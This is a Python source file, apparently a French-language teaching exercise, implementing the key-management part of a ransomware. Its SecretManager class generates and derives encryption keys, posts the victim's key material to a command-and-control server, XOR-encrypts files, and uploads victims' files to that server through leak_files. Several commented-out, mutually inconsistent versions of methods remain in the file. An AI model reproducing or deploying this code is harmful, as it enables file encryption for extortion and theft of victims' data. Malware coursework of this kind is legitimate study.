from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64
import hashlib
from pathlib import Path
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile



class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    #def do_derivation(self, salt:bytes, key:bytes)->bytes:
        #raise NotImplemented()
    
    
    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        # Crée un objet PBKDF2HMAC
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            salt=salt,
            iterations=self.ITERATION,
            length=self.KEY_LENGTH,
        )

        # Dérivation de la clé
        derived_key = kdf.derive(key)

        return derived_key

    def create(self) -> Tuple[bytes, bytes, bytes]:
        # Génére un salt aléatoire
        salt = os.urandom(self.SALT_LENGTH)

        # Génére une clé privée aléatoire
        private_key = os.urandom(self.KEY_LENGTH)

        # Effectue la dérivation de la clé privée
        derived_key = self.do_derivation(salt, private_key)

        return salt, private_key, derived_key

    #def create(self)->Tuple[bytes, bytes, bytes]:
       # raise NotImplemented()


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    #def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        #raise NotImplemented()
    

    def post_new(self, salt: bytes, key: bytes, token: bytes) ->int:
        # Convertit les bytes en chaînes Base64
        salt_b64 = self.bin_to_b64(salt)
        key_b64 = self.bin_to_b64(key)
        token_b64 = self.bin_to_b64(token)

        # Crée le dictionnaire JSON
        data = {
            "token": token_b64,
            "salt": salt_b64,
            "key": key_b64
        }

        dir_label = self.get_hex_token()
        # URL du CNC (Command and Control)
        cnc_url = f"http://{self._remote_host_port}/new?label={dir_label}" 
     



        # Envoie les données JSON au CNC
        response = requests.post(cnc_url, json=data)
        return response

        # Vérifie la réponse du serveur
        #if response.status_code == 200:
            #print("Données cryptographiques envoyées avec succès.")
        #else:
            #print(f"Échec de l'envoi des données. Code de réponse : {response.status_code}")

    #def bin_to_b64(self, data: bytes) -> str:
        # Convertit des bytes en chaîne Base64
        #return base64.b64encode(data).decode('utf-8')


    #def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        #raise NotImplemented()


   # def setup(self) -> None:
        # Génére un salt aléatoire
        salt = os.urandom(self.SALT_LENGTH)

        # Génére une clé privée aléatoire
        private_key = os.urandom(self.KEY_LENGTH)

        # Effectue la dérivation de la clé privée
        derived_key = self.do_derivation(salt,private_key)

     
        # Sauvegarde le salt et la clé 
        #salt_file_path = os.path.join(self._path, 'salt.bin')
        salt_file_path = os.path.join(f"{self._path}/token" , 'salt.bin')

        #token_file_path = os.path.join(self._path, 'token.bin')
        token_file_path = os.path.join(f"{self._path}/token" , 'token.bin')



        with open(salt_file_path, 'wb') as salt_file:
            salt_file.write(salt)

        with open(token_file_path, 'wb') as token_file:
            token_file.write(derived_key)

        # Envoye les données cryptographiques au CNC
        params = {'token': hashlib.sha256(derived_key).hexdigest()}
        body = {
            'salt': base64.b64encode(salt).decode('utf-8'),
            'key': base64.b64encode(derived_key).decode('utf-8')
        }

        response = self.post_new(self._path, params, body)

        if 'message' in response:
            print(response['message'])
        else:
            print(response['error'])

    def setup(self) -> None:
        # main function to create crypto data and register malware to cnc

        # creation of crypto data and assignment to member variables
        self._salt , self._key, self._token= self.create()
        
        
        # post request of said data
        post_status_code = self.post_new(self._salt, self._key, self._token)

        # we can display the returned status_code to check that everything worked
        self._log.debug("post_new request returned with code " + str(post_status_code))
        
        #token_path = f"{self._path}/token"
        #if not Path(token_path).exists():  
           # Path(token_path).mkdir(parents=True, exist_ok=False)
        #if Path(f"{token_path}/token.bin").exists():
            #raise FileExistsError
        
        # open taking parameter 'wb' allows the program to write into a binary file
        
        with open(os.path.join(self._path, "_token.bin"), "wb") as tokenfile:
            tokenfile.write(self._token)
        with open(os.path.join(self._path, "_salt.bin"), "wb") as saltfile:
            saltfile.write(self._salt)

        return None

    #def setup(self) -> None:
        # Vérifie la connexion au CNC
        try:
            url = f"http://{self._remote_host_port}/ping"
            response = requests.get(url)
            if response.status_code != 200:
                raise ConnectionError("CNC is unreachable")
        except ConnectionError as e:
            raise e

        # Vérifie si les fichiers token et salt existent
        if os.path.exists(os.path.join(self._path, "_token.bin")) or os.path.exists(os.path.join(self._path, "_salt.bin")):
            raise FileExistsError("A _token.bin file already exists. Cancelling setup.")

        # Crée les éléments cryptographiques
        self._salt, self._key, self._token,self.timestamp = self.create()

        # Crée le répertoire si nécessaire
        os.makedirs(self._path, exist_ok=True)
        # Sauvegarde localement le sel et le jeton
        with open(os.path.join(self._path, "_salt.bin"), "wb") as salt_file:
            salt_file.write(self._salt)
        with open(os.path.join(self._path, "_token.bin"), "wb") as token_file:
            token_file.write(self._token)
        
        # Envoie les éléments cryptographiques au CNC
        self.post_new(self._salt, self._key, self._token)

    #def load(self)->None:
        # function to load crypto data
        #raise NotImplemented()
    

    def load(self) -> None:
        # Charge le salt depuis le fichier local
        salt_file_path = os.path.join(self._path, 'salt.bin')
        if os.path.exists(salt_file_path):
            with open(salt_file_path, 'rb') as salt_file:
                self._salt = salt_file.read()
        else:
            print("Le fichier de sel n'existe pas. Assurez-vous de l'avoir généré auparavant.")

        # Charge le token depuis le fichier local
        token_file_path = os.path.join(self._path, 'token.bin')
        if os.path.exists(token_file_path):
            with open(token_file_path, 'rb') as token_file:
                self._token = token_file.read()
        else:
            print("Le fichier de token n'existe pas. Assurez-vous de l'avoir généré auparavant.")



    #def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        #raise NotImplemented()
    

  

    def check_key(self, candidate_key: bytes) -> bool:
        token = self.do_derivation(self._salt, candidate_key)
         # Comparaison de la clé candidate à la clé générée
        return token == self._token

    
    
    def set_key(self, b64_key: str) -> None:
        # Définit la clé en base64, ensuite valide la clé et stocker la clé
        candidate_key = base64.b64decode(b64_key)
        if self.check_key(candidate_key):
            self._key = candidate_key
        else:
            raise Exception("La clé fournie n'est pas valide.") 



    def get_hex_token(self) -> str:
        if not self._token:
            print("Le token n'est pas défini. Veuillez d'abord générer un token.")
            return ""

        # hachage le token
        sha256_hash = sha256(self._token)
        hex_token = sha256_hash.hexdigest()

        return hex_token


    #def xorfiles(self, files:List[str])->None:
        # xor a list for file
        #raise NotImplemented()


    #def xorfiles(self, files: List[str]) -> None:
        if not self._key:
            print("La clé n'est pas définie. Veuillez d'abord générer une clé.")
            return

        for file_path in files:
            if not os.path.exists(file_path):
                print(f"Le fichier {file_path} n'existe pas.")
                continue

            encrypted_file_path = f"{file_path}.encrypted"
            with open(file_path, 'rb') as input_file:
                with open(encrypted_file_path, 'wb') as output_file:
                    file_data = input_file.read()
                    key_length = len(self._key)

                    for i in range(len(file_data)):
                        # Utilisation la clé pour effectuer le chiffrement XOR
                        encrypted_byte = file_data[i] ^ self._key[i % key_length]
                        output_file.write(bytes([encrypted_byte]))

            print(f"Le fichier {file_path} a été chiffré et enregistré sous {encrypted_file_path}.")


    def xorfiles(self, files: List[str]) -> None:
        for file_path in files:
            try:
                xorfile(file_path, self._key)
            except Exception as e:
                self._log.error(f"Erreur lors du chiffrement/déchiffrement du fichier {file_path}: {e}")


    #def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        #raise NotImplemented()
    

    def leak_files(self, files: List[str]) -> None:
        # send files to the CNC
        # using hashed token filepath
        dir_label = self.get_hex_token()
        # creating destination URL
        folder_url = f"http://{self._remote_host_port}/file?label={dir_label}"
        # setting POST header
        header = {
                "Content-Type":"application/json"
                }
        for file in files:
            with open(f'{file}', 'rb') as f:
                # requests.post(file_url, files={f'f': f}, headers=header)
                file_data = self.bin_to_b64(f.read())
                file_json = {
                        # file name without parent directories in its path (relative path, in essence)
                        "file_name": file.rsplit('/', 1)[-1],
                        "file_data": file_data
                        }
                # POST request
                requests.post(folder_url, json=file_json, headers=header)
        return None


    #def clean(self):
        # remove crypto data from the target
        #raise NotImplemented()
 

    def clean(self) -> None:
        # Supprimerle fichier de salt
        salt_file_path = os.path.join(self._path, 'salt.bin')
        try:
            os.remove(salt_file_path)
            print("Le fichier de sel a été supprimé avec succès.")
        except FileNotFoundError:
            print("Le fichier de sel n'existe pas.")

        # Supprime le fichier de token
        token_file_path = os.path.join(self._path, 'token.bin')
        try:
            os.remove(token_file_path)
            print("Le fichier de token a été supprimé avec succès.")
        except FileNotFoundError:
            print("Le fichier de token n'existe pas.")




